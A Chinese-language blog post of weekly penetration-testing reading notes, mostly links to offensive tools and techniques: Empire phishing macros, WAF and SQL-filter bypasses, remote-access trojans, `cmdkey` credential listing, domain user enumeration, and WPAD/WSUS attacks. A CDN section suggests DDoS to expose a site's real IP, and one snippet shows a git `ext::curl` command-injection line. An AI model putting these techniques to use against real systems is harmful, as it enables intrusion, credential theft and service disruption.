---
title: 周结0
layout: post
tags:
  - reading-notes
  - summarize
category: Misc
comments: true
share: true
---
每日一看,一周总结

<!--more-->

* 谷歌搜索ntpamp.txt
* botnet（僵尸网络）
* [Broken Browser](https://www.brokenbrowser.com/abusing-of-protocols/)
* [brainfuck/0ok!解密](https://www.splitbrain.org/services/ook?mType=Group)
* [HTML5特性向量](http://html5sec.org/)
* [ORM（对象关系映射）](http://view.xiaomiquan.com/view/5844bba6afd2461d9c53cd63),是一种程序设计技术，用于面向对象编程语言里不同类型数据库的数据之间的转换。从效果上，创建了一个可在编程语言里使用的“虚拟对象数据库”
* [Announcing OSS-Fuzz: Continuous Fuzzing for Open Source Software](https://app.yinxiang.com/shard/s8/nl/16127008/a1473d50-6a18-4b8b-ba80-4db07974b355?title=Announcing%20OSS-Fuzz%3A%20Continuous%20Fuzzing%20for%20Open%20Source%20Software):[原文链接](https://security.googleblog.com/2016/12/announcing-oss-fuzz-continuous-fuzzing.html)
* [免费SSL](http://www.jianshu.com/p/4d1a795837d0?hmsr=toutiao.io&utm_medium=toutiao.io&utm_source=toutiao.io)
* [Empire钓鱼](https://www.cybrary.it/0p3n/powershell-empire-stagers-1-phishing-office-macro-evading-avs/),[Phishing with empire](https://enigma0x3.net/2016/03/15/phishing-with-empire/),[在Empire中配置Tor](http://www.mottoin.com/92761.html)
* [DNSLog:四叶草出的一款监控 DNS 解析记录和 HTTP 访问记录的工具。](https://github.com/BugScanTeam/DNSLog)
* [virscan：在线可疑文件扫描](http://www.virscan.org)
* [requestbin](https://requestb.in/):允许创建一个URL，利用这款工具进行收集请求，然后通过个性化方式进行检查
* [Hurl](https://www.hurl.it/):发出HTTP请求，输入URL，设置标题，查看响应，最后分享给其他人。类似的工具有：REST test test, Apigee console.
* [CORS proxy](http://www.corsproxy.com/):允许javascript跨域访问
* [Host tracker](http://www.host-tracker.com/):通过分布式ping/跟踪检查、定期监测、邮件/SMS /IM通知和统计进行网站检测性服务。类似工具有：Down for everyone or just me, Pimgdom ping service
* windows自带命令，`cmdkey /l`查看系统保存的凭证：![Alt text](/img/read_daily/1480957599260.png)
* https攻击，主要可以了解ssl的漏洞和群弱加密算法，还有降级攻击(https和hsts,一个302，一个307)、中间人攻击
* [Atomic Email Hunter](https://www.atompark.com)：邮件猎取软件
* [PC Hunter](http://www.xuetr.com/):windows信息系统查看软件； 类似[hunter](http://www.mottoin.com/93286.html)还有netview,也是api实现。既然要批量获取内网主机会话信息,那么肯定少不了获取机器列表,在hunter跟netview都使用NetServerEnum来获取主机列表,如果主机开防火墙之类的, 是无法获取的,其实要获取整个主机列表,完全可以使用LDAP去查询主机列表。我还是喜欢PVEFindADUser用到的技术,要是机器数量都获取不全,渗透个鸡毛的内网。
   - 列出服务器会话信息,(其实这也是渗透中最重要的,通过会话信息来确定,你需要的账户在不在这个机器登录过)。
   - 列出域内所有用户
   - 列出域内所有用户详细信息
   - 搜索某用户详细信息
   - 列出当前域所有组信息 
   - 搜索某用户在那个组 
* netpass.exe：windows下查看信息
* [java下orm注入的文档](http://view.xiaomiquan.com/view/5846136dafd2461d9c53d04d)
* 远控：darkcomet
* [wpad+wsus攻击](http://bobao.360.cn/learning/detail/3188.html)：Wsus是微软的补丁分发方案，由服务器端和客户端组成。使用场景，比如说内网不能上网机器，但是某一台可以上网，可以安装上网的服务端，客户端的机器设置url为可以上网的机器(服务端)的ip。客户端到服务端使用http，http明文传输，这样就可以篡改数据包，让下载恶意软件，但是补丁更新安装需要微软签名。此时可以使用psexec绕过并执行命令。
wpad是web的代理自动发现，微软的windows客户端用于自动配置本地代理设置的协议，协议允许用户客户端（例如IE）自动定位和使用适当的代理设置以访问企业网络出口。
* select关键字被拦截的绕过方法：
  - [Beyond SQLi: Obfuscate and Bypass](https://www.exploit-db.com/papers/17934/)
  - [sql注入绕过union select过滤](http://www.cnblogs.com/perl6/p/6120045.html)
* [linux肉鸡管理工具](https://jrat.io)
*  `chrome://chrome-urls/`![Alt text](/img/read_daily/1481117704078.png) `chrome://net-internals/#export`![Alt text](/img/read_daily/1481117787600.png)
*  `ip addr show`![Alt text](/img/read_daily/1481157696308.png)
*  [docker教程](https://www.gitbook.com/book/yeasy/docker_practice/details)
*  [javascript木马远控](http://view.xiaomiquan.com/view/5848b481afd2461d9c53d755)
*  [pentesting blogs](https://github.com/jhaddix/pentest-bookmarks/blob/wiki/BookmarksList.md)
*  cobalstrike:java编写的msf的图形化商业工具，见百度云工具
*  [wafbypass](http://www.tuicool.com/articles/VvuMbeA)
*  [Windows 名称解析机制探究及缺陷利用](http://wooyun.jozxing.cc/static/drops/papers-10887.html)
*  [域渗透之流量劫持](http://bobao.360.cn/learning/detail/3266.html)
*  [字典](https://github.com/rootphantomer/Blasting_dictionary)
*  [恶意代码分析笔记](http://bbs.pediy.com/showthread.php?t=202392)
*  [恶意代码分析练习](http://securitytrainings.net/presentations-for-training-advanced-malware-analysis/)
*  [githack](https://github.com/lijiejie/GitHack)：利用文件夹下的`.git`文件还原工程源代码，可以进一步审计代码，挖掘：文件上传，SQL注射等安全漏洞。
*  [BDF shellter](https://github.com/secretsquirrel/the-backdoor-factory):the-backdoor-factory,可执行的二进制shellcode
*  [POC编写](https://poc.evalbug.com/index.html)
*  [TRS WCM5.2](https://www.seebug.org/vuldb/ssvid-89487)
*  [BBScan：信息泄漏批量扫描脚本](https://www.secpulse.com/archives/40553.html)
*  [UXSS on Microsoft Edge ])(https://www.brokenbrowser.com/uxss-edge-domainless-world/)
*  [Bruteforcer：分布式多线程破解RAR文件密码](http://www.freebuf.com/sectool/122481.html)
*  [知网](http://www.zhihu.com/question/20188973/answer/114161504?utm_source=wechat_session&utm_medium=social):
![Alt text](/img/read_daily/1481820692906.png)

*  [路由器漏洞](http://routerpwn.com/)
*  [github安全类](https://share.weiyun.com/a2b24aedb04a453f984ea43e9466b5cb)

## 技巧

### CDN

**CDN**是构建在网络之上的内容分发网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。CDN的基本原理是广泛采用各种缓存服务器，将这些缓存服务器分布到用户访问相对集中的地区或网络中，在用户访问网站时，利用全局负载技术将用户的访问指向距离最近的工作正常的缓存服务器上，由缓存服务器直接响应用户请求。
* 查看域名的历史解析记录
* 注册的地方，看邮件头，扫C段
* 寻找主站的真实IP，搜集其他公司的所有IP，写脚本，绑定host，直接解析
* 验证是否存在CDN
通过在线的多地ping，通过各地区ping的结果得到ip，比较ip
* 验证ip和域名是否真实对应
修改本地hosts文件，强行将域名与ip解析对应，然后访问域名，查看页面是否变化
* ping顶级域名。厂商可能让www使用cdn，空域名不使用CDN缓存
* ping分站域名。为了省钱，分站未作CDN。对比IP
* 通过国外代理访问，或者通过国外的DNS解析。许多国内CDN只针对国内用户加速。
* mx记录查询，一般会是c段。一些网提供注册服务，可能会验证邮件，还有RSS订阅邮件、忘记密码等等可能服务器本身自带sendmail可以直接发送邮件，当然使用第三方的除外（如网易、腾讯的等）
通过邮件发送地址往往也能得到服务器IP。当然这个IP也要验证是否为主站的。Web版的邮件管理，可以通过常看网页源代码看到IP
* [信息查询](https://passivetotal.org/home)
* xss，让服务器主动连接攻击者
* 找彩蛋phpinfo();之类的探针
* DDOS，耗尽CDN流量，回源之后找到真实ip。不设防的cdn量大就会挂，高防CDN要增大流量
* 社工。勾搭CDN妹子
* 查看域名绑定历史,(17ce)[http://www.17ce.com/] (netcraft)[http://toolbar.netcraft.com/site_report?url=]
* DNS社工裤
* cloudflare (freebuff)[http://www.freebuf.com/articles/web/41533.html]
* 全网扫描，zmap

### 绕过waf

* [freebuf_印象笔记版](https://app.yinxiang.com/shard/s8/nl/16127008/b56ad611-189e-4fc0-837e-6ee20f29d4f8/)、[freebuf版](http://www.freebuf.com/articles/web/54686.html?winzoom=1)
* [webshell](https://github.com/l3m0n/Bypass_Disable_functions_Shell?files=1)
* ![Alt text](/img/read_daily/1482801164374.png)



### git执行任意命令

```
$ git clone "ext::curl orange.tw..."
可執行任意指令
```

## 编程

* [markdown_css](http://mrcoles.com/demo/markdown-css/)


## 环境

* [如何在 Ubuntu 环境下搭建邮件服务器](https://linux.cn/article-8071-1.html?utm_source=weibo&utm_medium=weibo&winzoom=1)
* 



## 社工

[京东数据](http://wx.jcloud.com/)
[信华数据](http://www.xinva.org/)


## 案例

[获取麦当劳用户密码-沙箱逃逸](https://finnwea.com/blog/stealing-passwords-from-mcdonalds-users)


































